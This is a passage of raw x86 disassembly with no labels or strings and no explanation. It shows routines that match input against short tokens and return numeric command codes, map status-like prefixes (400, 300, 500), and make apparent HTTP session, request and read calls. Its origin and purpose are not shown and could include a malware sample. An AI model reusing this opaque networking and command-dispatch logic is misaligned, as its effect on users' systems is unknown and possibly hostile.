13148f6e:	57                   	push   %edi
13148f6f:	0f 84 6e 03 00 00    	je     0x131492e3
13148f75:	8d 83 00 01 00 00    	lea    0x100(%ebx),%eax
13148f7b:	85 c0                	test   %eax,%eax
13148f7d:	89 44 24 18          	mov    %eax,0x18(%esp)
13148f81:	0f 84 5c 03 00 00    	je     0x131492e3
13148f87:	81 c3 00 02 00 00    	add    $0x200,%ebx
13148f8d:	85 db                	test   %ebx,%ebx
13148f8f:	89 5c 24 14          	mov    %ebx,0x14(%esp)
13148f93:	0f 84 4a 03 00 00    	je     0x131492e3
13148f99:	bf 00 04 00 00       	mov    $0x400,%edi
13148f9e:	57                   	push   %edi
13148f9f:	e8 5a c4 ff ff       	call   0x131453fe
13148fa4:	83 64 24 14 00       	andl   $0x0,0x14(%esp)
13148fa9:	8b f0                	mov    %eax,%esi
13148fab:	59                   	pop    %ecx
13148fac:	8b ee                	mov    %esi,%ebp
13148fae:	6a 00                	push   $0x0
13148fb0:	6a 01                	push   $0x1
13148fb2:	55                   	push   %ebp
13148fb3:	ff 35 88 46 17 13    	pushl  0x13174688
13148fb9:	ff 15 4c 37 15 13    	call   *0x1315374c
13148fbf:	83 f8 ff             	cmp    $0xffffffff,%eax
13148fc2:	0f 84 9c 00 00 00    	je     0x13149064
13148fc8:	85 c0                	test   %eax,%eax
13148fca:	0f 84 94 00 00 00    	je     0x13149064
13148fd0:	6a 0a                	push   $0xa
13148fd2:	55                   	push   %ebp
13148fd3:	e8 97 96 ff ff       	call   0x1314266f
13148fd8:	59                   	pop    %ecx
13148fd9:	85 c0                	test   %eax,%eax
13148fdb:	59                   	pop    %ecx
13148fdc:	75 0b                	jne    0x13148fe9
13148fde:	ff 44 24 10          	incl   0x10(%esp)
13148fe2:	45                   	inc    %ebp
13148fe3:	39 7c 24 10          	cmp    %edi,0x10(%esp)
13148fe7:	7c c5                	jl     0x13148fae
13148fe9:	56                   	push   %esi
13148fea:	e8 6a c4 ff ff       	call   0x13145459
13148fef:	59                   	pop    %ecx
13148ff0:	bf d8 0d 15 13       	mov    $0x13150dd8,%edi
13148ff5:	6a 04                	push   $0x4
13148ff7:	68 d0 0d 15 13       	push   $0x13150dd0
13148ffc:	57                   	push   %edi
13148ffd:	56                   	push   %esi
13148ffe:	e8 3a 96 ff ff       	call   0x1314263d
13149003:	59                   	pop    %ecx
13149004:	40                   	inc    %eax
13149005:	59                   	pop    %ecx
13149006:	50                   	push   %eax
13149007:	e8 85 96 ff ff       	call   0x13142691
1314900c:	83 c4 0c             	add    $0xc,%esp
1314900f:	bd 48 45 17 13       	mov    $0x13174548,%ebp
13149014:	85 c0                	test   %eax,%eax
13149016:	75 53                	jne    0x1314906b
13149018:	55                   	push   %ebp
13149019:	e8 df 96 ff ff       	call   0x131426fd
1314901e:	50                   	push   %eax
1314901f:	8d 46 01             	lea    0x1(%esi),%eax
13149022:	55                   	push   %ebp
13149023:	50                   	push   %eax
13149024:	e8 68 96 ff ff       	call   0x13142691
13149029:	83 c4 10             	add    $0x10,%esp
1314902c:	85 c0                	test   %eax,%eax
1314902e:	75 3b                	jne    0x1314906b
13149030:	bd cc 0d 15 13       	mov    $0x13150dcc,%ebp
13149035:	55                   	push   %ebp
13149036:	56                   	push   %esi
13149037:	e8 01 96 ff ff       	call   0x1314263d
1314903c:	40                   	inc    %eax
1314903d:	40                   	inc    %eax
1314903e:	50                   	push   %eax
1314903f:	e8 b9 96 ff ff       	call   0x131426fd
13149044:	83 c4 0c             	add    $0xc,%esp
13149047:	50                   	push   %eax
13149048:	55                   	push   %ebp
13149049:	56                   	push   %esi
1314904a:	e8 ee 95 ff ff       	call   0x1314263d
1314904f:	59                   	pop    %ecx
13149050:	40                   	inc    %eax
13149051:	59                   	pop    %ecx
13149052:	40                   	inc    %eax
13149053:	50                   	push   %eax
13149054:	53                   	push   %ebx
13149055:	e8 f6 96 ff ff       	call   0x13142750
1314905a:	83 c4 0c             	add    $0xc,%esp
1314905d:	6a 07                	push   $0x7
1314905f:	e9 ba 01 00 00       	jmp    0x1314921e
13149064:	33 ff                	xor    %edi,%edi
13149066:	e9 b4 01 00 00       	jmp    0x1314921f
1314906b:	6a 04                	push   $0x4
1314906d:	68 c4 0d 15 13       	push   $0x13150dc4
13149072:	57                   	push   %edi
13149073:	56                   	push   %esi
13149074:	e8 c4 95 ff ff       	call   0x1314263d
13149079:	59                   	pop    %ecx
1314907a:	40                   	inc    %eax
1314907b:	59                   	pop    %ecx
1314907c:	50                   	push   %eax
1314907d:	e8 0f 96 ff ff       	call   0x13142691
13149082:	83 c4 0c             	add    $0xc,%esp
13149085:	85 c0                	test   %eax,%eax
13149087:	75 48                	jne    0x131490d1
13149089:	55                   	push   %ebp
1314908a:	e8 6e 96 ff ff       	call   0x131426fd
1314908f:	50                   	push   %eax
13149090:	8d 46 01             	lea    0x1(%esi),%eax
13149093:	55                   	push   %ebp
13149094:	50                   	push   %eax
13149095:	e8 f7 95 ff ff       	call   0x13142691
1314909a:	83 c4 10             	add    $0x10,%esp
1314909d:	85 c0                	test   %eax,%eax
1314909f:	75 30                	jne    0x131490d1
131490a1:	bf c0 0d 15 13       	mov    $0x13150dc0,%edi
131490a6:	57                   	push   %edi
131490a7:	56                   	push   %esi
131490a8:	e8 90 95 ff ff       	call   0x1314263d
131490ad:	50                   	push   %eax
131490ae:	e8 4a 96 ff ff       	call   0x131426fd
131490b3:	83 c4 0c             	add    $0xc,%esp
131490b6:	50                   	push   %eax
131490b7:	57                   	push   %edi
131490b8:	56                   	push   %esi
131490b9:	e8 7f 95 ff ff       	call   0x1314263d
131490be:	59                   	pop    %ecx
131490bf:	59                   	pop    %ecx
131490c0:	50                   	push   %eax
131490c1:	53                   	push   %ebx
131490c2:	e8 89 96 ff ff       	call   0x13142750
131490c7:	83 c4 0c             	add    $0xc,%esp
131490ca:	6a 09                	push   $0x9
131490cc:	e9 4d 01 00 00       	jmp    0x1314921e
131490d1:	6a 03                	push   $0x3
131490d3:	68 bc 0d 15 13       	push   $0x13150dbc
131490d8:	57                   	push   %edi
131490d9:	56                   	push   %esi
131490da:	e8 5e 95 ff ff       	call   0x1314263d
131490df:	59                   	pop    %ecx
131490e0:	40                   	inc    %eax
131490e1:	59                   	pop    %ecx
131490e2:	50                   	push   %eax
131490e3:	e8 a9 95 ff ff       	call   0x13142691
131490e8:	83 c4 0c             	add    $0xc,%esp
131490eb:	85 c0                	test   %eax,%eax
131490ed:	75 07                	jne    0x131490f6
131490ef:	6a 06                	push   $0x6
131490f1:	e9 28 01 00 00       	jmp    0x1314921e
131490f6:	6a 04                	push   $0x4
131490f8:	68 b4 0d 15 13       	push   $0x13150db4
131490fd:	56                   	push   %esi
131490fe:	e8 8e 95 ff ff       	call   0x13142691
13149103:	83 c4 0c             	add    $0xc,%esp
13149106:	85 c0                	test   %eax,%eax
13149108:	75 1e                	jne    0x13149128
1314910a:	56                   	push   %esi
1314910b:	e8 ed 95 ff ff       	call   0x131426fd
13149110:	83 e8 05             	sub    $0x5,%eax
13149113:	50                   	push   %eax
13149114:	8d 46 05             	lea    0x5(%esi),%eax
13149117:	50                   	push   %eax
13149118:	53                   	push   %ebx
13149119:	e8 32 96 ff ff       	call   0x13142750
1314911e:	83 c4 10             	add    $0x10,%esp
13149121:	6a 04                	push   $0x4
13149123:	e9 f6 00 00 00       	jmp    0x1314921e
13149128:	6a 06                	push   $0x6
1314912a:	68 ac 0d 15 13       	push   $0x13150dac
1314912f:	57                   	push   %edi
13149130:	56                   	push   %esi
13149131:	e8 07 95 ff ff       	call   0x1314263d
13149136:	59                   	pop    %ecx
13149137:	59                   	pop    %ecx
13149138:	50                   	push   %eax
13149139:	e8 53 95 ff ff       	call   0x13142691
1314913e:	83 c4 0c             	add    $0xc,%esp
13149141:	85 c0                	test   %eax,%eax
13149143:	75 4d                	jne    0x13149192
13149145:	55                   	push   %ebp
13149146:	e8 b2 95 ff ff       	call   0x131426fd
1314914b:	50                   	push   %eax
1314914c:	8d 46 01             	lea    0x1(%esi),%eax
1314914f:	55                   	push   %ebp
13149150:	50                   	push   %eax
13149151:	e8 3b 95 ff ff       	call   0x13142691
13149156:	83 c4 10             	add    $0x10,%esp
13149159:	85 c0                	test   %eax,%eax
1314915b:	75 35                	jne    0x13149192
1314915d:	6a 40                	push   $0x40
1314915f:	50                   	push   %eax
13149160:	55                   	push   %ebp
13149161:	e8 bc 94 ff ff       	call   0x13142622
13149166:	68 a4 0d 15 13       	push   $0x13150da4
1314916b:	56                   	push   %esi
1314916c:	e8 cc 94 ff ff       	call   0x1314263d
13149171:	83 c0 06             	add    $0x6,%eax
13149174:	50                   	push   %eax
13149175:	55                   	push   %ebp
13149176:	e8 45 96 ff ff       	call   0x131427c0
1314917b:	55                   	push   %ebp
1314917c:	68 00 d1 14 13       	push   $0x1314d100
13149181:	53                   	push   %ebx
13149182:	ff 15 98 39 15 13    	call   *0x13153998
13149188:	83 c4 28             	add    $0x28,%esp
1314918b:	6a 08                	push   $0x8
1314918d:	e9 8c 00 00 00       	jmp    0x1314921e
13149192:	6a 06                	push   $0x6
13149194:	68 9c 0d 15 13       	push   $0x13150d9c
13149199:	57                   	push   %edi
1314919a:	56                   	push   %esi
1314919b:	e8 9d 94 ff ff       	call   0x1314263d
131491a0:	59                   	pop    %ecx
131491a1:	59                   	pop    %ecx
131491a2:	50                   	push   %eax
131491a3:	e8 e9 94 ff ff       	call   0x13142691
131491a8:	83 c4 0c             	add    $0xc,%esp
131491ab:	85 c0                	test   %eax,%eax
131491ad:	75 4f                	jne    0x131491fe
131491af:	55                   	push   %ebp
131491b0:	e8 48 95 ff ff       	call   0x131426fd
131491b5:	59                   	pop    %ecx
131491b6:	50                   	push   %eax
131491b7:	55                   	push   %ebp
131491b8:	57                   	push   %edi
131491b9:	68 c0 0d 15 13       	push   $0x13150dc0
131491be:	56                   	push   %esi
131491bf:	e8 79 94 ff ff       	call   0x1314263d
131491c4:	59                   	pop    %ecx
131491c5:	59                   	pop    %ecx
131491c6:	50                   	push   %eax
131491c7:	e8 71 94 ff ff       	call   0x1314263d
131491cc:	59                   	pop    %ecx
131491cd:	40                   	inc    %eax
131491ce:	59                   	pop    %ecx
131491cf:	50                   	push   %eax
131491d0:	e8 bc 94 ff ff       	call   0x13142691
131491d5:	83 c4 0c             	add    $0xc,%esp
131491d8:	85 c0                	test   %eax,%eax
131491da:	75 22                	jne    0x131491fe
131491dc:	68 94 0d 15 13       	push   $0x13150d94
131491e1:	56                   	push   %esi
131491e2:	e8 56 94 ff ff       	call   0x1314263d
131491e7:	83 c0 05             	add    $0x5,%eax
131491ea:	50                   	push   %eax
131491eb:	ff 74 24 30          	pushl  0x30(%esp)
131491ef:	e8 cc 95 ff ff       	call   0x131427c0
131491f4:	83 c4 10             	add    $0x10,%esp
131491f7:	6a 05                	push   $0x5
131491f9:	e9 e2 00 00 00       	jmp    0x131492e0
131491fe:	bb 88 0d 15 13       	mov    $0x13150d88,%ebx
13149203:	6a 09                	push   $0x9
13149205:	53                   	push   %ebx
13149206:	57                   	push   %edi
13149207:	56                   	push   %esi
13149208:	e8 30 94 ff ff       	call   0x1314263d
1314920d:	59                   	pop    %ecx
1314920e:	59                   	pop    %ecx
1314920f:	50                   	push   %eax
13149210:	e8 7c 94 ff ff       	call   0x13142691
13149215:	83 c4 0c             	add    $0xc,%esp
13149218:	85 c0                	test   %eax,%eax
1314921a:	74 11                	je     0x1314922d
1314921c:	6a 01                	push   $0x1
1314921e:	5f                   	pop    %edi
1314921f:	56                   	push   %esi
13149220:	e8 ed c1 ff ff       	call   0x13145412
13149225:	59                   	pop    %ecx
13149226:	8b c7                	mov    %edi,%eax
13149228:	e9 b8 00 00 00       	jmp    0x131492e5
1314922d:	bd 00 01 00 00       	mov    $0x100,%ebp
13149232:	55                   	push   %ebp
13149233:	6a 00                	push   $0x0
13149235:	ff 74 24 2c          	pushl  0x2c(%esp)
13149239:	e8 e4 93 ff ff       	call   0x13142622
1314923e:	55                   	push   %ebp
1314923f:	6a 00                	push   $0x0
13149241:	ff 74 24 2c          	pushl  0x2c(%esp)
13149245:	e8 d8 93 ff ff       	call   0x13142622
1314924a:	68 00 04 00 00       	push   $0x400
1314924f:	6a 00                	push   $0x0
13149251:	ff 74 24 34          	pushl  0x34(%esp)
13149255:	e8 c8 93 ff ff       	call   0x13142622
1314925a:	57                   	push   %edi
1314925b:	56                   	push   %esi
1314925c:	e8 dc 93 ff ff       	call   0x1314263d
13149261:	8b f8                	mov    %eax,%edi
13149263:	53                   	push   %ebx
13149264:	2b fe                	sub    %esi,%edi
13149266:	56                   	push   %esi
13149267:	4f                   	dec    %edi
13149268:	e8 d0 93 ff ff       	call   0x1314263d
1314926d:	bd cc 0d 15 13       	mov    $0x13150dcc,%ebp
13149272:	8b d8                	mov    %eax,%ebx
13149274:	55                   	push   %ebp
13149275:	56                   	push   %esi
13149276:	83 c3 09             	add    $0x9,%ebx
13149279:	e8 bf 93 ff ff       	call   0x1314263d
1314927e:	2b c3                	sub    %ebx,%eax
13149280:	55                   	push   %ebp
13149281:	56                   	push   %esi
13149282:	89 44 24 54          	mov    %eax,0x54(%esp)
13149286:	e8 b2 93 ff ff       	call   0x1314263d
1314928b:	83 c4 44             	add    $0x44,%esp
1314928e:	8b e8                	mov    %eax,%ebp
13149290:	45                   	inc    %ebp
13149291:	56                   	push   %esi
13149292:	45                   	inc    %ebp
13149293:	e8 65 94 ff ff       	call   0x131426fd
13149298:	8b ce                	mov    %esi,%ecx
1314929a:	57                   	push   %edi
1314929b:	2b cd                	sub    %ebp,%ecx
1314929d:	03 c1                	add    %ecx,%eax
1314929f:	89 44 24 24          	mov    %eax,0x24(%esp)
131492a3:	8d 46 01             	lea    0x1(%esi),%eax
131492a6:	50                   	push   %eax
131492a7:	ff 74 24 30          	pushl  0x30(%esp)
131492ab:	e8 a0 94 ff ff       	call   0x13142750
131492b0:	ff 74 24 20          	pushl  0x20(%esp)
131492b4:	53                   	push   %ebx
131492b5:	ff 74 24 30          	pushl  0x30(%esp)
131492b9:	e8 92 94 ff ff       	call   0x13142750
131492be:	ff 74 24 38          	pushl  0x38(%esp)
131492c2:	55                   	push   %ebp
131492c3:	ff 74 24 38          	pushl  0x38(%esp)
131492c7:	e8 84 94 ff ff       	call   0x13142750
131492cc:	ff 74 24 3c          	pushl  0x3c(%esp)
131492d0:	e8 84 c1 ff ff       	call   0x13145459
131492d5:	56                   	push   %esi
131492d6:	e8 37 c1 ff ff       	call   0x13145412
131492db:	83 c4 30             	add    $0x30,%esp
131492de:	6a 01                	push   $0x1
131492e0:	58                   	pop    %eax
131492e1:	eb 02                	jmp    0x131492e5
131492e3:	33 c0                	xor    %eax,%eax
131492e5:	5f                   	pop    %edi
131492e6:	5e                   	pop    %esi
131492e7:	5d                   	pop    %ebp
131492e8:	5b                   	pop    %ebx
131492e9:	83 c4 10             	add    $0x10,%esp
131492ec:	c3                   	ret    
131492ed:	56                   	push   %esi
131492ee:	68 80 00 00 00       	push   $0x80
131492f3:	e8 06 c1 ff ff       	call   0x131453fe
131492f8:	ff 74 24 0c          	pushl  0xc(%esp)
131492fc:	8b f0                	mov    %eax,%esi
131492fe:	68 dc 0d 15 13       	push   $0x13150ddc
13149303:	56                   	push   %esi
13149304:	ff 15 98 39 15 13    	call   *0x13153998
1314930a:	56                   	push   %esi
1314930b:	e8 36 fa ff ff       	call   0x13148d46
13149310:	83 c4 14             	add    $0x14,%esp
13149313:	85 c0                	test   %eax,%eax
13149315:	75 02                	jne    0x13149319
13149317:	5e                   	pop    %esi
13149318:	c3                   	ret    
13149319:	56                   	push   %esi
1314931a:	e8 f3 c0 ff ff       	call   0x13145412
1314931f:	59                   	pop    %ecx
13149320:	6a 01                	push   $0x1
13149322:	58                   	pop    %eax
13149323:	5e                   	pop    %esi
13149324:	c3                   	ret    
13149325:	55                   	push   %ebp
13149326:	8b ec                	mov    %esp,%ebp
13149328:	81 ec 00 01 00 00    	sub    $0x100,%esp
1314932e:	56                   	push   %esi
1314932f:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13149335:	ff 75 08             	pushl  0x8(%ebp)
13149338:	68 00 d1 14 13       	push   $0x1314d100
1314933d:	50                   	push   %eax
1314933e:	ff 15 98 39 15 13    	call   *0x13153998
13149344:	68 80 00 00 00       	push   $0x80
13149349:	e8 b0 c0 ff ff       	call   0x131453fe
1314934e:	8b f0                	mov    %eax,%esi
13149350:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13149356:	6a 21                	push   $0x21
13149358:	50                   	push   %eax
13149359:	e8 11 93 ff ff       	call   0x1314266f
1314935e:	83 c4 18             	add    $0x18,%esp
13149361:	85 c0                	test   %eax,%eax
13149363:	74 1d                	je     0x13149382
13149365:	6a 01                	push   $0x1
13149367:	6a 00                	push   $0x0
13149369:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
1314936f:	6a 21                	push   $0x21
13149371:	50                   	push   %eax
13149372:	e8 f8 92 ff ff       	call   0x1314266f
13149377:	59                   	pop    %ecx
13149378:	59                   	pop    %ecx
13149379:	50                   	push   %eax
1314937a:	e8 a3 92 ff ff       	call   0x13142622
1314937f:	83 c4 0c             	add    $0xc,%esp
13149382:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13149388:	50                   	push   %eax
13149389:	ff 75 0c             	pushl  0xc(%ebp)
1314938c:	68 e4 0d 15 13       	push   $0x13150de4
13149391:	56                   	push   %esi
13149392:	ff 15 98 39 15 13    	call   *0x13153998
13149398:	56                   	push   %esi
13149399:	e8 a8 f9 ff ff       	call   0x13148d46
1314939e:	83 c4 14             	add    $0x14,%esp
131493a1:	85 c0                	test   %eax,%eax
131493a3:	74 0a                	je     0x131493af
131493a5:	56                   	push   %esi
131493a6:	e8 67 c0 ff ff       	call   0x13145412
131493ab:	59                   	pop    %ecx
131493ac:	6a 01                	push   $0x1
131493ae:	58                   	pop    %eax
131493af:	5e                   	pop    %esi
131493b0:	c9                   	leave  
131493b1:	c3                   	ret    
131493b2:	56                   	push   %esi
131493b3:	68 80 00 00 00       	push   $0x80
131493b8:	e8 41 c0 ff ff       	call   0x131453fe
131493bd:	6a 21                	push   $0x21
131493bf:	8b f0                	mov    %eax,%esi
131493c1:	ff 74 24 10          	pushl  0x10(%esp)
131493c5:	e8 a5 92 ff ff       	call   0x1314266f
131493ca:	83 c4 0c             	add    $0xc,%esp
131493cd:	85 c0                	test   %eax,%eax
131493cf:	74 1a                	je     0x131493eb
131493d1:	6a 01                	push   $0x1
131493d3:	6a 00                	push   $0x0
131493d5:	6a 21                	push   $0x21
131493d7:	ff 74 24 14          	pushl  0x14(%esp)
131493db:	e8 8f 92 ff ff       	call   0x1314266f
131493e0:	59                   	pop    %ecx
131493e1:	59                   	pop    %ecx
131493e2:	50                   	push   %eax
131493e3:	e8 3a 92 ff ff       	call   0x13142622
131493e8:	83 c4 0c             	add    $0xc,%esp
131493eb:	ff 74 24 08          	pushl  0x8(%esp)
131493ef:	ff 74 24 10          	pushl  0x10(%esp)
131493f3:	68 f4 0d 15 13       	push   $0x13150df4
131493f8:	56                   	push   %esi
131493f9:	ff 15 98 39 15 13    	call   *0x13153998
131493ff:	56                   	push   %esi
13149400:	e8 41 f9 ff ff       	call   0x13148d46
13149405:	83 c4 14             	add    $0x14,%esp
13149408:	85 c0                	test   %eax,%eax
1314940a:	75 02                	jne    0x1314940e
1314940c:	5e                   	pop    %esi
1314940d:	c3                   	ret    
1314940e:	56                   	push   %esi
1314940f:	e8 fe bf ff ff       	call   0x13145412
13149414:	59                   	pop    %ecx
13149415:	6a 01                	push   $0x1
13149417:	58                   	pop    %eax
13149418:	5e                   	pop    %esi
13149419:	c3                   	ret    
1314941a:	56                   	push   %esi
1314941b:	57                   	push   %edi
1314941c:	8b 7c 24 0c          	mov    0xc(%esp),%edi
13149420:	6a 03                	push   $0x3
13149422:	68 10 0e 15 13       	push   $0x13150e10
13149427:	57                   	push   %edi
13149428:	33 f6                	xor    %esi,%esi
1314942a:	e8 62 92 ff ff       	call   0x13142691
1314942f:	83 c4 0c             	add    $0xc,%esp
13149432:	85 c0                	test   %eax,%eax
13149434:	75 07                	jne    0x1314943d
13149436:	b8 90 01 00 00       	mov    $0x190,%eax
1314943b:	eb 74                	jmp    0x131494b1
1314943d:	6a 03                	push   $0x3
1314943f:	68 0c 0e 15 13       	push   $0x13150e0c
13149444:	57                   	push   %edi
13149445:	e8 47 92 ff ff       	call   0x13142691
1314944a:	83 c4 0c             	add    $0xc,%esp
1314944d:	85 c0                	test   %eax,%eax
1314944f:	75 07                	jne    0x13149458
13149451:	b8 2c 01 00 00       	mov    $0x12c,%eax
13149456:	eb 59                	jmp    0x131494b1
13149458:	6a 03                	push   $0x3
1314945a:	68 08 0e 15 13       	push   $0x13150e08
1314945f:	57                   	push   %edi
13149460:	e8 2c 92 ff ff       	call   0x13142691
13149465:	83 c4 0c             	add    $0xc,%esp
13149468:	85 c0                	test   %eax,%eax
1314946a:	75 07                	jne    0x13149473
1314946c:	b8 f4 01 00 00       	mov    $0x1f4,%eax
13149471:	eb 3e                	jmp    0x131494b1
13149473:	6a 03                	push   $0x3
13149475:	68 04 0e 15 13       	push   $0x13150e04
1314947a:	57                   	push   %edi
1314947b:	e8 11 92 ff ff       	call   0x13142691
13149480:	83 c4 0c             	add    $0xc,%esp
13149483:	85 c0                	test   %eax,%eax
13149485:	75 28                	jne    0x131494af
13149487:	8a 47 04             	mov    0x4(%edi),%al
1314948a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
1314948e:	84 c0                	test   %al,%al
13149490:	74 14                	je     0x131494a6
13149492:	3c 0a                	cmp    $0xa,%al
13149494:	74 10                	je     0x131494a6
13149496:	3c 0d                	cmp    $0xd,%al
13149498:	74 0c                	je     0x131494a6
1314949a:	88 04 0e             	mov    %al,(%esi,%ecx,1)
1314949d:	8a 44 37 05          	mov    0x5(%edi,%esi,1),%al
131494a1:	46                   	inc    %esi
131494a2:	84 c0                	test   %al,%al
131494a4:	75 ec                	jne    0x13149492
131494a6:	80 24 0e 00          	andb   $0x0,(%esi,%ecx,1)
131494aa:	6a 64                	push   $0x64
131494ac:	58                   	pop    %eax
131494ad:	eb 02                	jmp    0x131494b1
131494af:	33 c0                	xor    %eax,%eax
131494b1:	5f                   	pop    %edi
131494b2:	5e                   	pop    %esi
131494b3:	c3                   	ret    
131494b4:	55                   	push   %ebp
131494b5:	8b ec                	mov    %esp,%ebp
131494b7:	81 ec 04 01 00 00    	sub    $0x104,%esp
131494bd:	53                   	push   %ebx
131494be:	56                   	push   %esi
131494bf:	57                   	push   %edi
131494c0:	bf 00 01 00 00       	mov    $0x100,%edi
131494c5:	33 db                	xor    %ebx,%ebx
131494c7:	57                   	push   %edi
131494c8:	53                   	push   %ebx
131494c9:	68 a8 46 17 13       	push   $0x131746a8
131494ce:	e8 4f 91 ff ff       	call   0x13142622
131494d3:	57                   	push   %edi
131494d4:	be 34 64 17 13       	mov    $0x13176434,%esi
131494d9:	53                   	push   %ebx
131494da:	56                   	push   %esi
131494db:	e8 42 91 ff ff       	call   0x13142622
131494e0:	6a 2b                	push   $0x2b
131494e2:	68 a8 46 17 13       	push   $0x131746a8
131494e7:	ff 75 08             	pushl  0x8(%ebp)
131494ea:	e8 8e c7 ff ff       	call   0x13145c7d
131494ef:	6a 2b                	push   $0x2b
131494f1:	56                   	push   %esi
131494f2:	ff 75 10             	pushl  0x10(%ebp)
131494f5:	e8 83 c7 ff ff       	call   0x13145c7d
131494fa:	8b 45 1c             	mov    0x1c(%ebp),%eax
131494fd:	83 c4 30             	add    $0x30,%esp
13149500:	05 00 02 00 00       	add    $0x200,%eax
13149505:	68 00 04 00 00       	push   $0x400
1314950a:	53                   	push   %ebx
1314950b:	38 18                	cmp    %bl,(%eax)
1314950d:	89 45 08             	mov    %eax,0x8(%ebp)
13149510:	68 ac 51 17 13       	push   $0x131751ac
13149515:	74 37                	je     0x1314954e
13149517:	e8 06 91 ff ff       	call   0x13142622
1314951c:	83 c4 0c             	add    $0xc,%esp
1314951f:	68 00 04 00 00       	push   $0x400
13149524:	68 ac 51 17 13       	push   $0x131751ac
13149529:	ff 75 08             	pushl  0x8(%ebp)
1314952c:	e8 cc 91 ff ff       	call   0x131426fd
13149531:	59                   	pop    %ecx
13149532:	50                   	push   %eax
13149533:	ff 75 08             	pushl  0x8(%ebp)
13149536:	e8 94 7e ff ff       	call   0x131413cf
1314953b:	68 00 04 00 00       	push   $0x400
13149540:	53                   	push   %ebx
13149541:	ff 75 08             	pushl  0x8(%ebp)
13149544:	e8 d9 90 ff ff       	call   0x13142622
13149549:	83 c4 1c             	add    $0x1c,%esp
1314954c:	eb 18                	jmp    0x13149566
1314954e:	e8 cf 90 ff ff       	call   0x13142622
13149553:	68 00 04 00 00       	push   $0x400
13149558:	53                   	push   %ebx
13149559:	68 34 60 17 13       	push   $0x13176034
1314955e:	e8 bf 90 ff ff       	call   0x13142622
13149563:	83 c4 18             	add    $0x18,%esp
13149566:	89 5d 10             	mov    %ebx,0x10(%ebp)
13149569:	89 5d 08             	mov    %ebx,0x8(%ebp)
1314956c:	e8 95 e8 ff ff       	call   0x13147e06
13149571:	85 c0                	test   %eax,%eax
13149573:	74 08                	je     0x1314957d
13149575:	e8 92 e8 ff ff       	call   0x13147e0c
1314957a:	89 45 10             	mov    %eax,0x10(%ebp)
1314957d:	e8 05 ee ff ff       	call   0x13148387
13149582:	85 c0                	test   %eax,%eax
13149584:	74 08                	je     0x1314958e
13149586:	e8 02 ee ff ff       	call   0x1314838d
1314958b:	89 45 08             	mov    %eax,0x8(%ebp)
1314958e:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
13149594:	57                   	push   %edi
13149595:	50                   	push   %eax
13149596:	ff 75 14             	pushl  0x14(%ebp)
13149599:	e8 5f 91 ff ff       	call   0x131426fd
1314959e:	59                   	pop    %ecx
1314959f:	50                   	push   %eax
131495a0:	ff 75 14             	pushl  0x14(%ebp)
131495a3:	e8 27 7e ff ff       	call   0x131413cf
131495a8:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
131495ae:	bf ac 59 17 13       	mov    $0x131759ac,%edi
131495b3:	50                   	push   %eax
131495b4:	ff 75 08             	pushl  0x8(%ebp)
131495b7:	ff 75 10             	pushl  0x10(%ebp)
131495ba:	56                   	push   %esi
131495bb:	68 5c 0e 15 13       	push   $0x13150e5c
131495c0:	57                   	push   %edi
131495c1:	ff 15 98 39 15 13    	call   *0x13153998
131495c7:	68 ac 51 17 13       	push   $0x131751ac
131495cc:	be 34 60 17 13       	mov    $0x13176034,%esi
131495d1:	68 4c 0e 15 13       	push   $0x13150e4c
131495d6:	56                   	push   %esi
131495d7:	ff 15 98 39 15 13    	call   *0x13153998
131495dd:	56                   	push   %esi
131495de:	e8 1a 91 ff ff       	call   0x131426fd
131495e3:	83 c4 38             	add    $0x38,%esp
131495e6:	a3 34 65 17 13       	mov    %eax,0x13176534
131495eb:	53                   	push   %ebx
131495ec:	53                   	push   %ebx
131495ed:	53                   	push   %ebx
131495ee:	53                   	push   %ebx
131495ef:	68 e4 d8 14 13       	push   $0x1314d8e4
131495f4:	ff 15 94 39 15 13    	call   *0x13153994
131495fa:	3b c3                	cmp    %ebx,%eax
131495fc:	89 45 10             	mov    %eax,0x10(%ebp)
131495ff:	74 53                	je     0x13149654
13149601:	6a 01                	push   $0x1
13149603:	53                   	push   %ebx
13149604:	6a 03                	push   $0x3
13149606:	53                   	push   %ebx
13149607:	53                   	push   %ebx
13149608:	ff 75 0c             	pushl  0xc(%ebp)
1314960b:	68 a8 46 17 13       	push   $0x131746a8
13149610:	50                   	push   %eax
13149611:	ff 15 dc 33 15 13    	call   *0x131533dc
13149617:	3b c3                	cmp    %ebx,%eax
13149619:	89 45 08             	mov    %eax,0x8(%ebp)
1314961c:	74 36                	je     0x13149654
1314961e:	6a 01                	push   $0x1
13149620:	68 00 00 40 00       	push   $0x400000
13149625:	53                   	push   %ebx
13149626:	53                   	push   %ebx
13149627:	53                   	push   %ebx
13149628:	57                   	push   %edi
13149629:	68 44 0e 15 13       	push   $0x13150e44
1314962e:	50                   	push   %eax
1314962f:	ff 15 70 37 15 13    	call   *0x13153770
13149635:	8b f8                	mov    %eax,%edi
13149637:	3b fb                	cmp    %ebx,%edi
13149639:	74 19                	je     0x13149654
1314963b:	ff 35 34 65 17 13    	pushl  0x13176534
13149641:	56                   	push   %esi
13149642:	6a 2f                	push   $0x2f
13149644:	68 14 0e 15 13       	push   $0x13150e14
13149649:	57                   	push   %edi
1314964a:	ff 15 80 36 15 13    	call   *0x13153680
13149650:	85 c0                	test   %eax,%eax
13149652:	75 04                	jne    0x13149658
13149654:	33 c0                	xor    %eax,%eax
13149656:	eb 6a                	jmp    0x131496c2
13149658:	8d 45 fc             	lea    -0x4(%ebp),%eax
1314965b:	be a8 47 17 13       	mov    $0x131747a8,%esi
13149660:	50                   	push   %eax
13149661:	68 ff 03 00 00       	push   $0x3ff
13149666:	56                   	push   %esi
13149667:	57                   	push   %edi
13149668:	ff 15 c0 36 15 13    	call   *0x131536c0
1314966e:	8b 45 fc             	mov    -0x4(%ebp),%eax
13149671:	c7 45 14 01 00 00 00 	movl   $0x1,0x14(%ebp)
13149678:	88 98 a8 47 17 13    	mov    %bl,0x131747a8(%eax)
1314967e:	38 1d a8 47 17 13    	cmp    %bl,0x131747a8
13149684:	8b 45 18             	mov    0x18(%ebp),%eax
13149687:	74 17                	je     0x131496a0
13149689:	05 00 02 00 00       	add    $0x200,%eax
1314968e:	50                   	push   %eax
1314968f:	56                   	push   %esi
